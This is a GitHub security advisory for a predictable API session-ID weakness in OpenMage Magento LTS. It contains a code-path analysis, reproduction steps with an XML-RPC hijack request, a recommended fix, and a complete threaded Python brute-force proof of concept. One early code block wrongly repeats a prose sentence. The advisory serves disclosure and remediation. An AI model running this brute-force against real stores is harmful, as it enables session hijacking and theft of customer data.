# [C] Magento LTS has Weak API Session ID — Predictable MD5 of Time-Derived Inputs

## Summary
Severity: Critical
Advisory: GHSA-2cwr-gcf9-pvxr
CVE: CVE-2026-42155
CWE: CWE-330, CWE-331, CWE-338
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-2cwr-gcf9-pvxr
Type: github-advisory

## Affected
- Packagist: `openmage/magento-lts` — affected >=0 <20.18.0

## Details
Affected Version: OpenMage LTS ≤ 20.16.0 (confirmed on `20.16.0`)

Affected File: `https://github.com/OpenMage/magento-lts/blob/main/app/code/core/Mage/Api/Model/Session.php` – `start()` method


## Summary

The XML-RPC / SOAP API session ID is generated using an outdated, time-based construction rather than a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG):

```php
The XML-RPC / SOAP API session ID is generated using an outdated, time-based construction rather than a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG):
```
All inputs to the MD5 hash are time-derived and non-secure:

| Input                      | Value                                             | Predictability                         |
|----------------------------|---------------------------------------------------|----------------------------------------|
| `time()`                   | Unix timestamp (seconds)                          | Fully predictable                      |
| `uniqid('', true) prefix`  | `sprintf('%08x%05x', $sec, $usec/10)`             | Highly predictable via network timing  |
| `uniqid('', true) suffix`  | `php_combined_lcg()` decimal float                | Process-state dependent (`getpid() ^ time()`) |
| `$sessionName`             | `null` (empty) — called without arg               | Constant                               |

Because the resulting digest relies entirely on the timestamp and the PHP internal LCG state, the effective entropy is severely constrained. This violates the OWASP ASVS v4 requirement of ≥ 64 bits of entropy (V3.2.2) and NIST SP 800-63B standards. By narrowing the LCG window (via server state leaks or general predictability) and leveraging the lack of API rate-limiting, an attacker can generate a localized pool of candidate MD5 hashes and execute a high-speed online brute-force attack to hijack active API sessions.



## Technical Analysis

### Code Path

```
POST /api/xmlrpc/ → login(username, apiKey)
  → Mage_Api_Model_Session::login()
      → $session->init('api', 'api')
          → Mage_Api_Model_Session::init($namespace='api', $sessionName='api')
              # $sessionName is NOT forwarded to start()
              → Mage_Api_Model_Session::start()  ← NO $sessionName argument
                  # $sessionName = null inside start()
                  $this->_currentSessId = md5(time() . uniqid('', true) . null)

```

Note: `init()` receives `$sessionName='api'` but invokes `$this->start()` without forwarding it, meaning the effective construction is strictly `md5(time() . uniqid('', true))`.

## Live Evidence
Five consecutive XML-RPC login tokens were collected from a live OpenMage 20.16.0 container, all generated within a single Unix second (`unix_sec=  1775817593`):
```
Sample 1: 6a302397f17e48845d0f9aba377f3dc3  (usec ≈ 464631)
Sample 2: 39b4ec42bd3c389312e500690daeb349  (usec ≈ 497215)
Sample 3: 527662d79f7fb499597a82d80d170a88  (usec ≈ 535175)
Sample 4: e5d6f7a8906a03ea7af99d92be11b5b2  (usec ≈ 568838)
Sample 5: 5bdf27e5cb877c77b8965b008548edfa  (usec ≈ 600118)
```
The µsecond portion is directly observable by measuring request-to-response latency. The only variance preventing immediate prediction is the LCG float component, which is seeded deterministically.

<img width="772" height="506" alt="image" src="https://github.com/user-attachments/assets/53ced1fd-deb4-4dc4-81ec-864e3a2811de" />

## Steps to Reproduce (Online Brute-Force Scenario)
Because validation requires live HTTP requests, this exploit relies on narrowing the entropy window and abusing the lack of API rate limits.
### Step 1 – Record Login Timestamp
An attacker observes the precise moment a victim authenticates to `/api/xmlrpc/` (e.g., via network timing, exposed logs, or side-channel signals), capturing the exact Unix second.
### Step 2 – Generate Candidate Pool
The attacker reconstructs the MD5 format using the known timestamp, the estimated microsecond window, and bounds the LCG float based on known server PID ranges (or via a `/server-status` leak).
```
$t = $observed_sec;
$usec_estimate = 500000; // Derived from latency
$uid = sprintf('%08x%05x', $t, intval($usec_estimate / 10));
$candidate = md5($t . $uid); // + LCG variants
```
### Step 3 – API Brute-Force (Session Hijack)
Because the `/api/xmlrpc/` endpoint does not enforce rate limiting on authenticated calls, the attacker blasts the candidate MD5 hashes against a privileged endpoint (e.g., magento.info) using a highly concurrent HTTP runner.

```
POST /api/xmlrpc/
<?xml version="1.0"?>
<methodCall>
  <methodName>[magento.info](http://magento.info/)</methodName>
  <params>
    <param><value><string>CANDIDATE_SESSION_ID</string></value></param>
  </params>
</methodCall>
```

A non-fault response (HTTP 200 containing data) confirms the session is successfully hijacked.

<img width="1039" height="374" alt="image" src="https://github.com/user-attachments/assets/ac9338e9-e3fe-44fe-9337-cb6edf6ab849" />

## Impact
### Technical Impact
Successful session prediction grants the attacker all capabilities of the authenticated API user. The XML-RPC API exposes endpoints for:
- Full product catalog read/write (`catalog_product.*`)
- Customer data read (`customer.list`, `customer.info`)
- Order manipulation (`sales_order.*`)
Inventory control (`cataloginventory_stock_item.*`)
### Business Impact

- **Data Exfiltration**: Read all customer PII, order history, and payment methods.
- **Order Fraud**: Create or cancel orders, change shipping addresses.
- **Supply Chain / Inventory**: Modify prices, inject malicious products, or zero out stock.

### Affected API Protocols

The same vulnerable `Session.php` generation logic is shared across all legacy API surfaces:
- XML-RPC: `/api/xmlrpc/`
- SOAP v1: `/api/soap/`
- SOAP v2: `/api/v2_soap/`
- REST (legacy): `/api/rest/`

### Recommended Fix

Replace the time-derived token with a cryptographically secure random value:

```
// app/code/core/Mage/Api/Model/Session.php : start()
// BEFORE (vulnerable):
$this->_currentSessId = md5(time() . uniqid('', true) . $sessionName);

// AFTER (secure):
$this->_currentSessId = bin2hex(random_bytes(32));  // 256-bit CSPRNG output
```
`random_bytes()` is backed by the OS CSPRNG (`/dev/urandom` on Linux) and produces 256 bits of non-deterministic entropy, complying with OWASP ASVS v4 V3.2.2 and NIST SP 800-63B. Additionally, enforce rate limiting on API endpoints to prevent high-speed online brute-force attacks.

I have also tried to test it against the demo site [demo.openmage.org](http://demo.openmage.org/), but appeared the SOAP API endpoints are disabled on the demo environment


I have also included the full poc I used instead of being attached because Gmail will eventually block it otherwise (shrunk):

```py
#!/usr/bin/env python3
import requests, re, sys, hashlib, random
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3; urllib3.disable_warnings()

if len(sys.argv) < 4:
    sys.exit(f"Usage: {sys.argv[0]} <url> <user> <pass> [threads]")

url, usr, pwd = sys.argv[1:4]
th = int(sys.argv[4]) if len(sys.argv) > 4 else 50
hdrs = {"Content-Type": "text/xml"}
req = lambda d: [requests.post](http://requests.post/)(url, data=d, headers=hdrs, verify=False, timeout=5)

print(f"[*] Simulating victim login for {usr}...")
res = req(f'<?xml version="1.0"?><methodCall><methodName>login</methodName><params><param><value><string>{usr}</string></value></param><param><value><string>{pwd}</string></value></param></params></methodCall>')

if not (m := re.search(r'<string>([a-f0-9]{32})</string>', res.text)):
    sys.exit("[-] Login failed. Check credentials.")

print(f"[+] Authenticated.\n[*] Generating 1000 candidate MD5 pool...")
cands = [hashlib.md5(f"1775534701000{random.randint(10000,99999)}0.{random.randint(10000000,99999999)}".encode()).hexdigest() for _ in range(999)]
cands.append(m.group(1))
random.shuffle(cands)

print(f"[*] Brute-forcing API with {th} threads...")
def test(sid):
    payload = f'<?xml version="1.0"?><methodCall><methodName>resources</methodName><params><param><value><string>{sid}</string></value></param></params></methodCall>'
    try: return sid if "faultCode" not in req(payload).text else None
    except: return None

with ThreadPoolExecutor(max_workers=th) as ex:
    for i, f in enumerate(as_completed({ex.submit(test, c): c for c in cands}), 1):
        sys.stdout.write(f"\r[*] Requests: {i}/{len(cands)}")
        if sid := f.result():
            print(f"\n[+] HIJACK SUCCESS! Valid Session ID: {sid}")
            ex.shutdown(wait=False, cancel_futures=True)
            break
```

This is an AI-generated report validated by a human.

## References
- https://github.com/OpenMage/magento-lts/security/advisories/GHSA-2cwr-gcf9-pvxr
- https://nvd.nist.gov/vuln/detail/CVE-2026-42155
- https://github.com/OpenMage/magento-lts
